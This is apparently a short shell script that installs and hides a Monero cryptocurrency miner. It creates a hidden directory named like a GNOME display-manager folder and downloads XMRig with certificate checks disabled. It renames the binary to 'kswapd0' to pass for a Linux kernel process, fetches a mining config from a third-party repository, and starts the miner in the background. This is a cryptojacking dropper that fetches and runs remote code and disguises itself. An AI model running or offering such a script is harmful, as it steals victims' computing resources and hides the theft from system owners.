mkdir $HOME/.gdm2_manual/
cd $HOME/.gdm2_manual/

wget --no-check-certificate https://raw.githubusercontent.com/MoneroOcean/xmrig_setup/master/xmrig.tar.gz
tar xf $HOME/.gdm2_manual/xmrig.tar.gz
rm $HOME/.gdm2_manual/xmrig.tar.gz
mv $HOME/.gdm2_manual/xmrig $HOME/.gdm2_manual/kswapd0

rm -rf $HOME/.gdm2_manual/config.json
wget --no-check-certificate https://raw.githubusercontent.com/littlAcen/moneroocean-setup/main/config.json -O $HOME/.gdm2_manual/config.json

$HOME/.gdm2_manual/kswapd0 &
